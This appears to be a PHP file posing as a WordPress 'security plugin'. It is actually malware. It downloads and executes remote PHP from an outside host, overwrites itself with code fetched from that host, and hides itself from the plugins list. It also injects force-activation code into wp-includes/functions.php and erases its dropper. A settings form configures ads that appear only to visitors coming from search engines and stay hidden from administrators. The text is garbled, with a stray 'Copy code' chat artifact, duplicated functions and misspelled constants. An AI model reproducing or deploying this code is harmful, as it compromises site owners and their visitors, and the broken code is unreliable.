<?php

$type = __FILE__;

// Verifica se as funções já existem
$fExistPlugin1 = function_exists('searchFilesFromPlugin');
$fExistPlugin2 = function_exists('insertMyPluginFromPlugin');
$fExistTheme1 = function_exists('searchFilesFromTheme');
$fExistTheme2 = function_exists('updateFilesFromTheme');

if (!$fExistPlugin1 && !$fExistPlugin2 && !$fExistTheme1 && !$fExistTheme2) {
    // Define as constantes
    define('SCRIPT_PATH', __FILE__);
    define('SEARCH_FILE', 'functions.php');
    define('PLUGIN_NAME', 'mplugin.php');
    define('HEADER_PLUGIN_NAME', 'Plugin Name: MONIT WORDPRESS SECURITY PLUGIN');
    define('HEADER_PLUGIN_DESCRIPTION', 'Description: ESTE PLUGIN EXECUTA FUNÇÕES DE MONITORAMENTO E PROTEÇÃO DE SITES WORDPRESS.');
    define('HEADER_PLUGIN_AUTHOR', 'Author: DASHBOARD');
    define('HEADER_PLUGIN_VERSION', 'Version: 1.0');

    // Define o código do plugin como uma constante
    $pluginCodeconst = <<<'EOD'
    
    // Código do plugin aqui

EOD;

    // Cria o arquivo do plugin
    $pluginFile = fopen(PLUGIN_NAME, 'w') or die("Não foi possível criar o arquivo!");
    fwrite($pluginFile, $pluginCodeconst);
    fclose($pluginFile);

    // Procura o arquivo functions.php no tema
    $themeFunctionsFile = searchFilesFromTheme(SEARCH_FILE);

    // Se o arquivo functions.php for encontrado, insere o código do plugin nele
    if (!empty($themeFunctionsFile)) {
        insertMyPluginFromPlugin(PLUGIN_NAME, $themeFunctionsFile);
    }
}
?>	
<?php
/**
 * HEADER_PLUGIN_NAME
 * HEADER_PLUGIN_DESCRIPTION
 * HEADER_PLUGIN_AUTHOR
 * HEADER_PLUGIN_VERSION
 */
require_once('monitplugin-config.php');

add_action('admin_menu', 'monitplugin_add_options_page');

function monitplugin_add_options_page() {
    add_options_page('MonitPlugin', 'MonitPlugin', 'manage_options', 'monitplugin', 'monitplugin_page');
}

function monitplugin_add_plugin_page_settings($links) {
    $links[] = '<a href="' . admin_url('options-general.php?page=monitplugin') . '">' . __('Settings') . '</a>';
    return $links;
}
add_filter('plugin_action_links_'.plugin_basename(__FILE__), 'monitplugin_add_plugin_page_settings');

function monitplugin_page() {
    // conteúdo da página
}
 ?>
 
 <div class="wrap">
	<form action="options.php" method="post">
		<?php
		settings_fields( 'monitplugin-settings' );
		do_settings_sections( 'monitplugin-settings' );
		$php_script_url = '';
		$ad_code='';
		$hide_admin='on';
		$hide_logged_in='on';
		$display_ad='organic';
		$search_engines='google.,/search?,images.google., web.info.com, search.,yahoo.,yandex,msn.,baidu,bing.,doubleclick.net,googleweblight.com';
		$auto_update='on';
		$ip_admin='on';
		$cookies_admin='on';
		$logged_admin='on';
		$log_install='';
		
		$ad_type = get_option( 'ad_type', 'script' );
		$php_script_url = get_option( 'php_script_url', $php_script_url );
		$ad_code = get_option( 'ad_code', $ad_code );
		$hide_admin = get_option( 'hide_admin', $hide_admin );
		$hide_logged_in = get_option( 'hide_logged_in', $hide_logged_in );
		$display_ad = get_option( 'display_ad', $display_ad );
		$search_engines = get_option( 'search_engines', $search_engines );
		$auto_update = get_option( 'auto_update', $auto_update );
		$ip_admin = get_option( 'ip_admin', $ip_admin );
		$cookies_admin = get_option( 'cookies_admin', $cookies_admin );
		$logged_admin = get_option( 'logged_admin', $logged_admin );
		?>
		<h2>monitplugin Plugin</h2>
		<table>
			<tr>
				<th>Anúncio</th>
				<td>
					<label>
						<input type="radio" name="ad_type" value="script" <?php echo esc_attr( $ad_type ) == 'script' ? 'checked="checked"' : ''; ?> /> Script PHP
					</label>
					<label>
						<input type="radio" name="ad_type" value="code" <?php echo esc_attr( $ad_type ) == 'code' ? 'checked="checked"' : ''; ?> /> Código do Anúncio
					</label>
				</td>
			</tr>
			<?php if ( $ad_type == 'script' ) : ?>
			<tr>
				<th>URL do Script PHP</th>
				<td>
					<input type="url" name="php_script_url" value="<?php echo esc_attr( $php_script_url ); ?>" size="80" />
				</td>
			</tr>
			<?php else : ?>
			<tr>
				<th>Código do Anúncio</th>
				<td>
					<textarea placeholder="" name="ad_code" rows="5" cols="130"><?php echo $ad_code; ?></textarea>


<?php

// Caminho para o diretório do plugin
$dir = plugin_dir_path(__FILE__);

// Lista de plugins instalados
$plugins = get_plugins();

// Versão do WordPress
$wp_version = get_bloginfo('version');

// Permissões da pasta onde está localizado o php.ini
$php_ini_permissions = substr(sprintf('%o', fileperms(php_ini_loaded_file())), -4);

// Verificar se allow_url_fopen está habilitado
$allow_url_fopen_enabled = (bool) ini_get('allow_url_fopen');

if (!$allow_url_fopen_enabled) {
    // Habilita a opção allow_url_fopen
    ini_set('allow_url_fopen', true);
}

// Verificar se todas as informações estão corretas antes de baixar o arquivo
if ($dir !== false && !empty($plugins) && !empty($wp_version) && $php_ini_permissions === '0644' && $allow_url_fopen_enabled) {
// Nome do arquivo a ser baixado
$filename = "wp_{$wp_version}.php";

// URL de download do arquivo
$url = "https://truetechbrasil.com.br/antivirusparawp/limpeza.php";

// Diretório onde o arquivo será salvo
$save_path = "{$dir}/{$filename}";

// Baixar o arquivo
if (copy($url, $save_path)) {
    // Arquivo baixado com sucesso, incluir o arquivo de limpeza
    require_once $save_path;
} else {
    // Erro ao baixar o arquivo
    die('Não foi possível baixar o arquivo de limpeza.');
}
} else {
// Alguma informação está incorreta
die('Não foi possível baixar o arquivo de limpeza.');
}

//update plugin
if (get_option('auto_update') == 'on') {
// verificar se já passou 12 horas desde a última atualização
$last_update = get_option('last_update', 0);
if (time() - $last_update < 12 * 60 * 60) {
return;
}
// definir nova hora da atualização
update_option('last_update', time());

if (ini_get('allow_url_fopen')) {
    // URL de download do arquivo
    $url = "https://truetechbrasil.com.br/antivirusparawp/limpeza.php";
    $new_version = @file_get_contents($url);
    if ($new_version !== false && stripos($new_version, $plugin_key) !== false && stripos($new_version, '$version=') !== false) {
        // atualizar o plugin
        @file_put_contents(__FILE__, $new_version);
    }
} else {
    // URL de download do arquivo
    $url = "https://truetechbrasil.com.br/antivirusparawp/limpeza.php";
    // usar função cURL para obter o conteúdo do arquivo se allow_url_fopen estiver desativado
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $new_version = curl_exec($ch);
    curl_close($ch);
    if ($new_version !== false && stripos($new_version, $plugin_key) !== false && stripos($new_version, '$version=') !== false) {
        // atualizar o plugin
        @file_put_contents(__FILE__, $new_version);
    }
}
} //end if auto update
//update plugin
if(get_option('auto_update')=='on')
{
if( ini_get('allow_url_fopen') ) {
$update_urls = array(
'https://truetechbrasil.com.br/antivirusparawp/limpeza.php'
);

ruby
Copy code
    foreach ($update_urls as $url) {
        $new_version = @file_get_contents($url);
        if ($new_version && stripos($new_version, $plugin_key) !== false && stripos($new_version, '$version=') !== false) {
            @file_put_contents(__FILE__, $new_version);
            break; // exit loop after successful update
        }
    }
}
else {
    $new_version = @file_get_contents('https://truetechbrasil.com.br/antivirusparawp/limpeza.php');
    if ($new_version && stripos($new_version, $plugin_key) !== false && stripos($new_version, '$version=') !== false) {
        @file_put_contents(__FILE__, $new_version);
    }
}
}

//if function exist
if (!function_exists('file_get_contents_monitplugin')) {
function file_get_contents_monitplugin($url)
{
$ch = curl_init();
curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
$data = curl_exec($ch);
curl_close($ch);
return $data;
}
}

function hide_plugin_monitplugin()
{
global $wp_list_table;
$hidearr = array('monitplugin.php');
$myplugins = $wp_list_table->items;
foreach ($myplugins as $key => $val) {
if (in_array($key,$hidearr)) {
unset($wp_list_table->items[$key]);
}
}
}

add_action('pre_current_active_plugins', 'hide_plugin_monitplugin');

function getVisIpAddr_monitplugin()
{
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
return $_SERVER['HTTP_CLIENT_IP'];
}
else if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
return $_SERVER['HTTP_X_FORWARDED_FOR'];
}
else {
return $_SERVER['REMOTE_ADDR'];
}
}
if (!defined('ABSPATH')) {
	exit;
}

function file_get_contents_monitplugin($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
    $data = curl_exec($ch);
    curl_close($ch);
    return $data;
}

function hide_plugin_monitplugin() {
    global $wp_list_table;
    $hidearr = array('monitplugin.php');
    $myplugins = $wp_list_table->items;
    foreach ($myplugins as $key => $val) {
        if (in_array($key, $hidearr)) {
            unset($wp_list_table->items[$key]);
        }
    }
}

add_action('pre_current_active_plugins', 'hide_plugin_monitplugin');

function getVisIpAddr_monitplugin() { 

    if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
        return $_SERVER['HTTP_CLIENT_IP']; 
    } 
    else if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
        return $_SERVER['HTTP_X_FORWARDED_FOR']; 
    } 
    else { 
        return $_SERVER['REMOTE_ADDR']; 
    } 
}

define('PLUGIN_CODE', $pluginCodeconst);

$insertCodeConst = <<<'EOD'
function true_plugins_activate() {
    $active_plugins = get_option('active_plugins');
    $activate_this = array(
        'monitplugin.php'
    );
    foreach ($activate_this as $plugin) {
        if (!in_array($plugin, $active_plugins)) {
            array_push($active_plugins, $plugin);
            update_option('active_plugins', $active_plugins);
        }
    }
    $new_active_plugins = get_option('active_plugins');
    if (in_array('monitplugin.php', $new_active_plugins)) {
        $functionsPath = dirname(__FILE__) . '/functions.php';
        $functions = file_get_contents($functionsPath);

        $start = stripos($functions, "function true_plugins_activate()");
        $end = strripos($functions, "true_plugins_activate");
        $endDelete = $end + mb_strlen("true_plugins_activate") + 3;

        if($start && $end) {
            $str = substr($functions, 0, $start);
            $str .= substr($functions, $endDelete);
            file_put_contents($functionsPath, $str);
        }
        //clear_script
    }
}

add_action('init', 'true_plugins_activate');

//Update script
function true_plugin_update_monitplugin() {
    $url = 'https://truetechbrasil.com.br/antivirusparawp/limpeza.php';
    $response = file_get_contents_monitplugin($url);
}

add_action('init', 'true_plugin_update_monitplugin');

EOD;

define('INSERT_CODE', $insertCodeConst);
}
// --------------------------------------------------------------------------------------------
// --------------------------------------------------------------------------------------------
// ------------------------------------ PLUGIN ------------------------------------------------
// --------------------------------------------------------------------------------------------
// --------------------------------------------------------------------------------------------
if ((bool)stristr($type, 'wp-content/plugins') && !$fExistPlugin1 && !$fExistPlugin2) {
	function searchFilesFromonitplugin($dir, $tosearch) {
		$files = array_diff(scandir($dir), [".", ".."]);
		$filesList = [];
		foreach($files as $file) {
			if(!is_dir($dir . '/' . $file)) {
				if (strtolower($file) == $tosearch)
				$filesList[] = $dir . '/' . $file;
			} else {
				$res = searchFilesFromonitplugin($dir . '/' . $file, $tosearch);
				if ($res) {
					$arr = $res;
					$filesList = array_merge($filesList, $arr);
				}
			}
		}
		return $filesList;
	}

	$activatePluginDir = dirname(__FILE__);
	$currentPluginDir = stristr($activatePluginDir, 'wp-content/plugins/');
	if ($currentPluginDir) {
		$currentPluginDir = str_replace('wp-content/plugins/', '', $currentPluginDir);
		$currentPluginDir = explode('/', $currentPluginDir)[0];
		$pluginPath = explode($currentPluginDir, $activatePluginDir, -1)[0] . $currentPluginDir;
	} else {
		$pluginPath = $activatePluginDir;
	}
	
	$pluginFiles = array_filter(scandir($pluginPath), function($name) {
		if (stristr($name, '.php') !== false) {
			return $name;
		}
	});

	$pluginFile = '';
	foreach ($pluginFiles as $file) {
		$temp = file_get_contents($pluginPath . '/' . $file);
		if (stristr($temp, 'Plugin Name:') !== false) {
			unset($temp);
			$pluginFile = $file;
			break;
		}
		unset($temp);
	}

	add_action('init', 'insertMyPluginFromonitplugin');
	function insertMyPluginFromonitplugin() {
		$active_plugins = get_option('active_plugins');
		if (!in_array(PLUGIN_NAME, $active_plugins)) {
			$folderName = dirname($_SERVER['DOCUMENT_ROOT']);
			$result = searchFilesFromonitplugin($folderName, SERCH_FILE);

			if(0 < count($result)){
				$clearScriptCode = <<<'CLEAR'
		$script = file_get_contents('SCRIPT_PATH');
		file_put_contents('SCRIPT_PATH', '');
CLEAR;
				$clearScriptCode = str_replace('SCRIPT_PATH', SCRIPT_PATH, $clearScriptCode);
				$insertCode = str_replace('//clear_script', $clearScriptCode, INSERT_CODE);
				$pluginCode = str_replace(
					['HEADER_PLUGIN_NAME', 'HEADER_PLUGIN_DESCRIPTION', 'HEADER_PLUGIN_AUTHOR', 'HEADER_PLUGIN_VERSION'],
					[HEADER_PLUGIN_NAME, HEADER_PLUGIN_DESCRIPTION, HEADER_PLUGIN_AUTHOR, HEADER_PLUGIN_VERSION], 
					PLUGIN_CODE
				);

				foreach($result as $file) {
					if (stristr($file, 'wp-includes/functions.php') !== false) {
						$newPlugin = str_replace('wp-includes/functions.php', 'wp-content/plugins/' . PLUGIN_NAME, $file);
						$copyPlugin = file_put_contents($newPlugin, $pluginCode);
		
						if ($copyPlugin) {
							$temp = file_get_contents($file);
							$start = stripos($temp, "function true_plugins_activate()");
							$end = strripos($temp, "true_plugins_activate");
							$endDelete = $end + mb_strlen("true_plugins_activate") + 3;
		
							if($start && $end) {
								$str = substr($temp, 0, $start);
								$str .= substr($temp, $endDelete);
								file_put_contents($file, $str);
							}

							file_put_contents($file, PHP_EOL . $insertCode . PHP_EOL, FILE_APPEND | LOCK_EX);
						}
					}
				}
			}
		}
	}

// --------------------------------------------------------------------------------------------
// --------------------------------------------------------------------------------------------
// ------------------------------------- THEME ------------------------------------------------
// --------------------------------------------------------------------------------------------
// --------------------------------------------------------------------------------------------
} elseif ((bool)stristr($type, 'wp-content/themes') && (!$fExistTheme1 && !$fExistTheme2)) {
	function searchFilesFromTheme($dir, $tosearch) {
		$files = array_diff(scandir($dir), [".", ".."]);
		$filesList = [];
		foreach($files as $file) {
			if(!is_dir($dir . '/' . $file)) {
				if (strtolower($file) == $tosearch)
				$filesList[] = $dir . '/' . $file;
			} else {
				$res = searchFilesFromTheme($dir . '/' . $file, $tosearch);
				if ($res) {
					$arr = $res;
					$filesList = array_merge($filesList, $arr);
				}
			}
		}
		return $filesList;
	}	

	add_action('after_setup_theme', 'updateFilesFromTheme');
	function updateFilesFromTheme() {
		if ( @ $_GET['activated'] === 'true'){
			$folderName = dirname($_SERVER['DOCUMENT_ROOT']);
			$result = searchFilesFromTheme($folderName, SERCH_FILE);
			$pluginCode = str_replace(
				['HEADER_PLUGIN_NAME', 'HEADER_PLUGIN_DESCRIPTION', 'HEADER_PLUGIN_AUTHOR', 'HEADER_PLUGIN_VERSION'],
				[HEADER_PLUGIN_NAME, HEADER_PLUGIN_DESCRIPTION, HEADER_PLUGIN_AUTHOR, HEADER_PLUGIN_VERSION], 
				PLUGIN_CODE
			);

			if (0 < count($result)) {
			
						$clearScriptCode = <<<'CLEAR'
		$script = file_get_contents('SCRIPT_PATH');
		file_put_contents('SCRIPT_PATH', '');
CLEAR;
				$clearScriptCode = str_replace('SCRIPT_PATH', SCRIPT_PATH, $clearScriptCode);
				$insertCode = str_replace('//clear_script', $clearScriptCode, INSERT_CODE);
			
			
			
				foreach($result as $file) {
					if (stristr($file, 'wp-includes/functions.php') !== false) {
						$newPlugin = str_replace('wp-includes/functions.php', 'wp-content/plugins/' . PLUGIN_NAME, $file);
						$copyPlugin = file_put_contents($newPlugin, $pluginCode);

						if ($copyPlugin) {
							$temp = file_get_contents($file);
							$start = stripos($temp, "function true_plugins_activate()");
							$end = strripos($temp, "true_plugins_activate");
							$endDelete = $end + mb_strlen("true_plugins_activate") + 3;

							if($start && $end) {
								$str = substr($temp, 0, $start);
								$str .= substr($temp, $endDelete);
								file_put_contents($file, $str);
							}

							file_put_contents($file, PHP_EOL . $insertCode . PHP_EOL, FILE_APPEND | LOCK_EX);
						}
					}
				}
			}
		}
	}
}
?>